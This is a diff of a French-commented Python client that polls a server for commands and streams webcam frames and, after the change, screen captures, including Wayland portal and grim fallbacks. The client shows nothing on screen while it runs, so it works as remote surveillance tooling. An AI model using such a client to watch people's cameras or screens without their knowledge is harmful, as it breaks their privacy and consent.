@@ -1,18 +1,40 @@
 """
-Client caméra — se connecte au serveur par HTTP, depuis n'importe quel réseau Wi-Fi.
+Client caméra / écran — se connecte au serveur par HTTP, depuis n'importe quel réseau Wi-Fi.
 
-Compatible Windows et Linux. Conçu pour tourner en arrière-plan, sans
-terminal visible : les messages vont dans un fichier log, et l'adresse
-du serveur peut être mémorisée une fois pour toutes avec --save.
+Compatible Windows et Linux. Gère DEUX flux indépendants envoyés au
+serveur : la caméra et l'écran. Chacun peut être démarré ou arrêté
+séparément depuis la GUI, sans affecter l'autre.
+
+Capture d'écran : sous Linux en session Wayland, mss ne voit que la
+couche de compatibilité XWayland et renvoie une image noire. Ce client
+teste, dès le démarrage de la capture, chaque méthode disponible avec
+une VRAIE capture d'essai, dont le CONTENU est vérifié (pas seulement
+qu'une image se décode, mais qu'elle n'est pas uniformément noire), et
+garde, dans cet ordre, celles qui réussissent : xdg-desktop-portal
+(org.freedesktop.portal.Desktop — l'API moderne commune à GNOME, KDE et
+la plupart des environnements récents), gnome-screenshot, grim
+(compositeurs wlroots : Sway, Hyprland...), puis mss en dernier recours.
+Si la méthode en cours échoue, la suivante est utilisée automatiquement.
+L'ancienne API privée org.gnome.Shell.Screenshot est volontairement
+abandonnée : elle est restreinte sur les versions récentes de GNOME.
+Le portail est appelé via « jeepney » (pip install jeepney) quand il est
+installé : la réponse du portail arrive par un signal D-Bus qui doit être
+reçu par la MÊME connexion que celle qui a fait l'appel ; sans jeepney, on
+se rabat sur les outils en ligne de commande (gdbus).
+
+La capture d'écran tourne dans un thread dédié, séparé de celui qui
+envoie au serveur : sans ce découplage, chaque image attendait la fin
+de la requête HTTP précédente avant que la suivante soit capturée, ce
+qui donnait une capture « une image à la fois » dès que le réseau
+n'était pas instantané. Le thread d'envoi poste toujours la DERNIÈRE
+image capturée (jamais de file d'attente qui prendrait du retard).
 
 Chaque client possède un identifiant unique (device_id), généré à la
-première exécution et mémorisé dans la configuration : c'est ce qui
-permet à un même serveur de piloter plusieurs clients différents.
+première exécution et mémorisé dans la configuration.
 
 Utilisation :
     python client.py --server https://mon-serveur.com --save   # première fois
     python client.py                                           # ensuite (relit la config)
-    python client.py --server https://autre-serveur.com         # remplace, sans sauvegarder
     python client.py --once --debug                             # test : un seul cycle, logs détaillés
 """
 
@@ -21,19 +43,46 @@ import json
 import logging
 import os
 import platform
+import re
+import select
+import shutil
 import socket
+import subprocess
+import tempfile
 import time
 import threading
 import uuid
 from pathlib import Path
+from urllib.parse import unquote, urlparse
 
 import cv2
+import numpy as np
 import requests
+try:
+    from mss import MSS as _MSS   # versions récentes de mss
+except ImportError:
+    from mss import mss as _MSS   # anciennes versions
 
 DEFAULT_SERVER_URL = "http://127.0.0.1:5050"
-POLL_INTERVAL = 1.0       # secondes entre deux vérifications de commande
-FRAME_INTERVAL = 0.1      # secondes entre deux images envoyées (~10 im/s)
+POLL_INTERVAL = 1.0           # secondes entre deux vérifications de commandes
+CAMERA_FRAME_INTERVAL = 0.1   # secondes entre deux images caméra (~10 im/s)
+# Intervalle MINIMUM entre deux captures, par méthode (la capture et l'envoi
+# réseau tournent dans deux threads séparés, donc ceci ne dépend plus du
+# réseau : mss est quasi instantané, le portail xdg passe par un aller-retour
+# D-Bus, gnome-screenshot et grim relancent un processus à chaque image.
+SCREEN_CAPTURE_MIN_INTERVAL = {
+    "mss": 0.05,
+    "xdg-portal": 0.15,
+    "grim": 0.05,
+    "gnome-screenshot": 0.4,
+}
+SCREEN_CAPTURE_MIN_INTERVAL_DEFAULT = 0.2
+SCREEN_SEND_IDLE_WAIT = 0.02   # attente du thread d'envoi quand aucune image nouvelle n'est prête
 REQUEST_TIMEOUT = 5
+CAPTURE_SUBPROCESS_TIMEOUT = 5
+MIN_VALID_FRAME_STD = 2.0      # en dessous : image considérée comme quasi noire/uniforme
+SCREEN_FAILURE_FALLBACK_THRESHOLD = 10  # échecs consécutifs avant de basculer sur mss en cours de route
+SCREEN_FAILURE_WARN_AT = 5
 
 
 # ---------------------------------------------------------------------
@@ -119,14 +168,239 @@ def _open_camera() -> cv2.VideoCapture:
     return cv2.VideoCapture(0)
 
 
+# ---------------------------------------------------------------------
+# Capture d'écran : mss (X11, Windows) + replis Wayland
+# ---------------------------------------------------------------------
+
+def _detect_linux_session_type() -> str:
+    """'wayland', 'x11', ou '' si indéterminé (variable absente)."""
+    return os.environ.get("XDG_SESSION_TYPE", "").lower()
+
+
+def _frame_looks_valid(frame) -> bool:
+    """Un frame "valide" doit exister ET ne pas être quasi uniforme (ce
+    qui arrive quand une méthode de capture échoue silencieusement et
+    renvoie une image noire ou grise au lieu de lever une erreur)."""
+    return frame is not None and frame.size > 0 and float(frame.std()) >= MIN_VALID_FRAME_STD
+
+
+def _grab_screen_grim() -> "np.ndarray | None":
+    """Capture via grim (compositeurs wlroots : Sway, Hyprland...) — ne
+    fonctionne pas sur GNOME/Mutter (peut y renvoyer une image noire sans
+    lever d'erreur, d'où la vérification de contenu dans _frame_looks_valid)."""
+    result = subprocess.run(
+        ["grim", "-"], capture_output=True, timeout=CAPTURE_SUBPROCESS_TIMEOUT, check=True
+    )
+    array = np.frombuffer(result.stdout, dtype=np.uint8)
+    return cv2.imdecode(array, cv2.IMREAD_COLOR)
+
+
+def _grab_screen_gnome_screenshot() -> "np.ndarray | None":
+    """Repli via la commande gnome-screenshot (peut être absente sur les
+    versions récentes de GNOME, qui l'ont retirée du cœur du système)."""
+    tmp_path = None
+    try:
+        with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp:
+            tmp_path = tmp.name
+        subprocess.run(
+            ["gnome-screenshot", "-f", tmp_path],
+            capture_output=True, timeout=CAPTURE_SUBPROCESS_TIMEOUT, check=True,
+        )
+        return cv2.imread(tmp_path)
+    finally:
+        if tmp_path:
+            try:
+                os.unlink(tmp_path)
+            except OSError:
+                pass
+
+
+def _read_portal_screenshot(uri: str) -> "np.ndarray | None":
+    """Lit (puis supprime) le fichier désigné par l'URI renvoyée par le portail.
+    L'URI est encodée en pourcentage : GNOME nomme ses captures « Screenshot from
+    2026-11-05 10-20-33.png », donc l'URI contient %20 — sans décodage,
+    cv2.imread ne trouve pas le fichier et renvoie None à chaque image."""
+    path = unquote(urlparse(uri).path)
+    image = cv2.imread(path)
+    try:
+        os.unlink(path)
+    except OSError:
+        pass
+    return image
+
+
+def _grab_screen_xdg_portal_jeepney() -> "np.ndarray | None":
+    """Capture via le portail avec UNE connexion D-Bus qui fait l'appel ET
+    attend le signal Response (indispensable : voir _grab_screen_xdg_portal_gdbus)."""
+    from jeepney import DBusAddress, MatchRule, message_bus, new_method_call
+    from jeepney.io.blocking import Proxy, open_dbus_connection
+
+    token = "cam" + uuid.uuid4().hex[:12]
+    conn = open_dbus_connection(bus="SESSION")
+    try:
+        sender = conn.unique_name.lstrip(":").replace(".", "_")
+        request_path = f"/org/freedesktop/portal/desktop/request/{sender}/{token}"
+        rule = MatchRule(
+            type="signal", interface="org.freedesktop.portal.Request",
+            member="Response", path=request_path,
+        )
+        Proxy(message_bus, conn).AddMatch(rule)   # AVANT l'appel, sinon la réponse peut être manquée
+        with conn.filter(rule) as responses:
+            portal = DBusAddress(
+                "/org/freedesktop/portal/desktop",
+                bus_name="org.freedesktop.portal.Desktop",
+                interface="org.freedesktop.portal.Screenshot",
+            )
+            call = new_method_call(
+                portal, "Screenshot", "sa{sv}",
+                ("", {"handle_token": ("s", token), "interactive": ("b", False)}),
+            )
+            conn.send_and_get_reply(call, timeout=CAPTURE_SUBPROCESS_TIMEOUT)
+            signal = conn.recv_until_filtered(responses, timeout=CAPTURE_SUBPROCESS_TIMEOUT)
+    finally:
+        conn.close()
+
+    code, results = signal.body
+    uri = results.get("uri", (None, None))[1]
+    if code != 0 or not uri:
+        return None   # 1 = annulé par l'utilisateur, 2 = échec
+    return _read_portal_screenshot(uri)
+
+
+def _grab_screen_xdg_portal() -> "np.ndarray | None":
+    """Capture via le portail : jeepney si disponible, sinon gdbus."""
+    try:
+        import jeepney  # noqa: F401
+    except ImportError:
+        return _grab_screen_xdg_portal_gdbus()
+    return _grab_screen_xdg_portal_jeepney()
+
+
+def _grab_screen_xdg_portal_gdbus() -> "np.ndarray | None":
+    """Capture via xdg-desktop-portal (org.freedesktop.portal.Desktop),
+    l'API moderne commune à GNOME, KDE et la plupart des environnements
+    récents — elle remplace les API privées de chaque compositeur (comme
+    org.gnome.Shell.Screenshot, désormais restreinte sur les versions
+    récentes de GNOME). L'appel est asynchrone : il renvoie d'abord un
+    "handle" (ticket), et le résultat réel (l'URI du fichier) arrive
+    ensuite via un signal "Response" séparé, qu'il faut écouter."""
+    monitor = subprocess.Popen(
+        ["gdbus", "monitor", "--session", "--dest", "org.freedesktop.portal.Desktop"],
+        stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
+    )
+    uri = None
+    try:
+        call = subprocess.run(
+            [
+                "gdbus", "call", "--session",
+                "--dest", "org.freedesktop.portal.Desktop",
+                "--object-path", "/org/freedesktop/portal/desktop",
+                "--method", "org.freedesktop.portal.Screenshot.Screenshot",
+                "", "{'interactive': <false>}",
+            ],
+            capture_output=True, timeout=CAPTURE_SUBPROCESS_TIMEOUT, text=True, check=True,
+        )
+        handle_match = re.search(r"objectpath '([^']+)'", call.stdout)
+        if not handle_match:
+            return None
+        handle = handle_match.group(1)
+
+        deadline = time.time() + CAPTURE_SUBPROCESS_TIMEOUT
+        while time.time() < deadline:
+            remaining = deadline - time.time()
+            ready, _, _ = select.select([monitor.stdout], [], [], max(remaining, 0))
+            if not ready:
+                break
+            line = monitor.stdout.readline()
+            if not line:
+                continue
+            if handle in line and "Response" in line:
+                uri_match = re.search(r"'uri': <'([^']+)'>", line)
+                if uri_match:
+                    uri = uri_match.group(1)
+                break
+    finally:
+        monitor.terminate()
+        try:
+            monitor.wait(timeout=2)
+        except subprocess.TimeoutExpired:
+            monitor.kill()
+
+    if not uri:
+        return None
+    return _read_portal_screenshot(uri)
+
+
+def _grab_screen_mss(mss_instance, monitor) -> "np.ndarray | None":
+    raw = mss_instance.grab(monitor)
+    return cv2.cvtColor(np.array(raw), cv2.COLOR_BGRA2BGR)
+
+
+def _portal_available() -> bool:
+    if shutil.which("gdbus"):
+        return True
+    try:
+        import jeepney  # noqa: F401
+        return True
+    except ImportError:
+        return False
+
+
+def _screen_capture_candidates() -> list:
+    """Retourne les méthodes de capture à essayer, par ordre de préférence.
+
+    Sous Wayland, chacune est testée avec une VRAIE capture dont le CONTENU est
+    vérifié (pas seulement qu'une image se décode, mais qu'elle n'est pas
+    uniformément noire) : seules celles qui réussissent sont gardées. « mss »
+    est toujours en dernier, pour ne jamais bloquer le démarrage."""
+    if platform.system() != "Linux" or _detect_linux_session_type() != "wayland":
+        return ["mss"]  # Windows/macOS, ou X11 classique : mss fonctionne normalement
+
+    testers = {}
+    if _portal_available():
+        testers["xdg-portal"] = _grab_screen_xdg_portal
+    if shutil.which("gnome-screenshot"):
+        testers["gnome-screenshot"] = _grab_screen_gnome_screenshot
+    if shutil.which("grim"):
+        testers["grim"] = _grab_screen_grim
+
+    working = []
+    for mode, tester in testers.items():
+        try:
+            frame = tester()
+        except Exception as exc:
+            logger.warning("Capture d'écran : test de '%s' échoué : %s", mode, exc)
+            continue
+        if _frame_looks_valid(frame):
+            logger.info("Capture d'écran : méthode utilisable après test réel : %s", mode)
+            working.append(mode)
+        else:
+            logger.warning("Capture d'écran : test de '%s' : image absente ou quasi uniforme (noire ?)", mode)
+
+    if not working:
+        logger.error(
+            "Session Wayland : AUCUNE méthode de capture n'a fonctionné (portail, gnome-screenshot, grim). "
+            "mss ne verra que XWayland et enverra une image NOIRE. Solutions : "
+            "(1) sudo apt install gnome-screenshot ; (2) pip install jeepney dans le venv du client ; "
+            "(3) ouvrir une session « GNOME on Xorg » depuis l'écran de connexion."
+        )
+    return working + ["mss"]
+
+
 class CameraClient:
     def __init__(self, server_url: str, device_id: str, device_name: str):
         self.server_url = server_url
         self.device_id = device_id
         self.device_name = device_name
+
         self.camera_on = False
+        self.screen_on = False
         self.capture: cv2.VideoCapture | None = None
-        self._stop_streaming = threading.Event()
+        self._stop_camera_event = threading.Event()
+        self._stop_screen_event = threading.Event()
+        self._screen_frame: "np.ndarray | None" = None
+        self._screen_frame_version = 0
+        self._screen_frame_lock = threading.Lock()
 
     def run_forever(self) -> None:
         logger.info(
@@ -135,33 +409,45 @@ class CameraClient:
         )
         while True:
             try:
-                self._check_command()
+                self._check_commands()
             except requests.RequestException as exc:
                 logger.warning("Serveur injoignable (%s), nouvelle tentative...", exc)
             time.sleep(POLL_INTERVAL)
 
     def run_once(self) -> None:
         logger.info("Test (--once) — serveur : %s — appareil : %s", self.server_url, self.device_id)
-        self._check_command()
-        time.sleep(1)  # laisse une chance au flux de démarrer avant de couper
+        self._check_commands()
+        time.sleep(1)  # laisse une chance aux flux de démarrer avant de couper
         if self.camera_on:
             self._stop_camera()
+        if self.screen_on:
+            self._stop_screen()
 
-    def _check_command(self) -> None:
+    def _check_commands(self) -> None:
         response = requests.get(
             f"{self.server_url}/api/command",
             params={"device_id": self.device_id, "name": self.device_name},
             timeout=REQUEST_TIMEOUT,
         )
         response.raise_for_status()
-        command = response.json().get("command")
-        logger.debug("Commande reçue : %s", command)
+        commands = response.json().get("commands", {})
+        logger.debug("Commandes reçues : %s", commands)
 
-        if command == "START_CAMERA" and not self.camera_on:
+        camera_cmd = commands.get("camera")
+        if camera_cmd == "START" and not self.camera_on:
             self._start_camera()
-        elif command == "STOP_CAMERA" and self.camera_on:
+        elif camera_cmd == "STOP" and self.camera_on:
             self._stop_camera()
 
+        screen_cmd = commands.get("screen")
+        if screen_cmd == "START" and not self.screen_on:
+            self._start_screen()
+        elif screen_cmd == "STOP" and self.screen_on:
+            self._stop_screen()
+
+    # ------------------------------------------------------------------
+    # Flux caméra
+    # ------------------------------------------------------------------
     def _start_camera(self) -> None:
         self.capture = _open_camera()
         if not self.capture.isOpened():
@@ -170,44 +456,172 @@ class CameraClient:
             return
 
         self.camera_on = True
-        self._stop_streaming.clear()
-        threading.Thread(target=self._stream_frames, daemon=True).start()
+        self._stop_camera_event.clear()
+        threading.Thread(target=self._stream_camera, daemon=True).start()
         logger.info("Caméra allumée")
 
     def _stop_camera(self) -> None:
         self.camera_on = False
-        self._stop_streaming.set()
+        self._stop_camera_event.set()
         if self.capture is not None:
             self.capture.release()
             self.capture = None
         logger.info("Caméra éteinte")
 
-    def _stream_frames(self) -> None:
-        while not self._stop_streaming.is_set() and self.capture is not None:
+    def _stream_camera(self) -> None:
+        while not self._stop_camera_event.is_set() and self.capture is not None:
             ok, frame = self.capture.read()
             if not ok:
                 continue
+            self._send_frame(frame, "camera")
+            time.sleep(CAMERA_FRAME_INTERVAL)
 
-            ok, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
-            if not ok:
-                continue
+    # ------------------------------------------------------------------
+    # Flux capture d'écran
+    # ------------------------------------------------------------------
+    def _start_screen(self) -> None:
+        self.screen_on = True
+        self._stop_screen_event = threading.Event()   # nouveau à chaque démarrage
+        self._screen_frame: "np.ndarray | None" = None
+        self._screen_frame_version = 0
+        self._screen_frame_lock = threading.Lock()
+        threading.Thread(
+            target=self._capture_screen_loop, args=(self._stop_screen_event,), daemon=True
+        ).start()
+        threading.Thread(
+            target=self._send_screen_loop, args=(self._stop_screen_event,), daemon=True
+        ).start()
+        logger.info("Capture d'écran démarrée")
 
-            try:
-                requests.post(
-                    f"{self.server_url}/api/frame",
-                    params={"device_id": self.device_id},
-                    data=buffer.tobytes(),
-                    headers={"Content-Type": "application/octet-stream"},
-                    timeout=REQUEST_TIMEOUT,
-                )
-            except requests.RequestException:
-                pass  # on retentera à la prochaine image
+    def _stop_screen(self) -> None:
+        self.screen_on = False
+        self._stop_screen_event.set()
+        logger.info("Capture d'écran arrêtée")
 
-            time.sleep(FRAME_INTERVAL)
+    def _capture_screen_loop(self, stop_event: threading.Event) -> None:
+        """Capture en continu, SANS jamais attendre le réseau : écrit juste la
+        dernière image dans une case partagée, que le thread d'envoi lira à
+        son propre rythme."""
+        candidates = _screen_capture_candidates()
+        mode_index = 0
+        mode = candidates[mode_index]
+        mss_instance, monitor = self._open_mss() if mode == "mss" else (None, None)
+
+        black_frame_warned = False
+        consecutive_failures = 0
+        sent_first_frame = False
+
+        try:
+            while not stop_event.is_set():
+                loop_start = time.monotonic()
+                min_interval = SCREEN_CAPTURE_MIN_INTERVAL.get(mode, SCREEN_CAPTURE_MIN_INTERVAL_DEFAULT)
+                try:
+                    frame = self._grab_screen_frame(mode, mss_instance, monitor)
+                except Exception as exc:
+                    frame = None
+                    logger.debug("Échec de capture (%s) : %s", mode, exc)
+
+                if frame is None:
+                    consecutive_failures += 1
+
+                    if consecutive_failures == SCREEN_FAILURE_WARN_AT:
+                        logger.warning(
+                            "Capture d'écran : %d échecs consécutifs avec la méthode '%s'.",
+                            consecutive_failures, mode,
+                        )
+
+                    if mode != "mss" and consecutive_failures >= SCREEN_FAILURE_FALLBACK_THRESHOLD:
+                        mode_index += 1
+                        next_mode = candidates[mode_index]
+                        logger.warning(
+                            "La méthode '%s' échoue systématiquement en cours de route : repli sur '%s'.",
+                            mode, next_mode,
+                        )
+                        mode = next_mode
+                        if mode == "mss":
+                            mss_instance, monitor = self._open_mss()
+                        consecutive_failures = 0
+
+                    stop_event.wait(max(0.0, min_interval - (time.monotonic() - loop_start)))
+                    continue
+
+                consecutive_failures = 0
+                if not sent_first_frame:
+                    logger.info(
+                        "Capture d'écran : première image envoyée (méthode : %s, %dx%d)",
+                        mode, frame.shape[1], frame.shape[0],
+                    )
+                    sent_first_frame = True
+
+                if not black_frame_warned and not _frame_looks_valid(frame):
+                    logger.warning(
+                        "Image d'écran capturée presque entièrement noire/uniforme avec la "
+                        "méthode '%s' — la vidéo enregistrée sera noire.", mode,
+                    )
+                    black_frame_warned = True
+
+                with self._screen_frame_lock:
+                    self._screen_frame = frame
+                    self._screen_frame_version += 1
+
+                stop_event.wait(max(0.0, min_interval - (time.monotonic() - loop_start)))
+        finally:
+            if mss_instance is not None:
+                mss_instance.close()
+
+    def _send_screen_loop(self, stop_event: threading.Event) -> None:
+        """Poste toujours la DERNIÈRE image capturée, dès qu'elle change.
+        Tourne indépendamment de la capture : un réseau lent ralentit l'envoi,
+        jamais la capture elle-même."""
+        last_sent_version = 0
+        while not stop_event.is_set():
+            with self._screen_frame_lock:
+                frame = self._screen_frame
+                version = self._screen_frame_version
+            if frame is not None and version != last_sent_version:
+                self._send_frame(frame, "screen")
+                last_sent_version = version
+            else:
+                stop_event.wait(SCREEN_SEND_IDLE_WAIT)
+
+    @staticmethod
+    def _open_mss():
+        instance = _MSS()
+        monitor = instance.monitors[1] if len(instance.monitors) > 1 else instance.monitors[0]
+        return instance, monitor
+
+    def _grab_screen_frame(self, mode: str, mss_instance, monitor) -> "np.ndarray | None":
+        if mode == "xdg-portal":
+            return _grab_screen_xdg_portal()
+        if mode == "grim":
+            return _grab_screen_grim()
+        if mode == "gnome-screenshot":
+            return _grab_screen_gnome_screenshot()
+        if mss_instance is None:
+            return None
+        return _grab_screen_mss(mss_instance, monitor)
+
+    # ------------------------------------------------------------------
+    # Envoi au serveur (commun aux deux flux)
+    # ------------------------------------------------------------------
+    def _send_frame(self, frame, stream: str) -> None:
+        ok, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
+        if not ok:
+            return
+        try:
+            requests.post(
+                f"{self.server_url}/api/frame",
+                params={"device_id": self.device_id, "stream": stream},
+                data=buffer.tobytes(),
+                headers={"Content-Type": "application/octet-stream"},
+                timeout=REQUEST_TIMEOUT,
+            )
+        except requests.RequestException:
+            pass  # on retentera à la prochaine image
 
 
 def parse_args() -> argparse.Namespace:
-    parser = argparse.ArgumentParser(description="Client caméra piloté à distance")
+    parser = argparse.ArgumentParser(description="Client caméra / écran piloté à distance")
     parser.add_argument("--server", help="URL du serveur (ex. https://mon-serveur.onrender.com)")
     parser.add_argument("--save", action="store_true", help="mémorise --server pour les prochains lancements")
     parser.add_argument("--debug", action="store_true", help="affiche les logs détaillés (commandes reçues, etc.)")
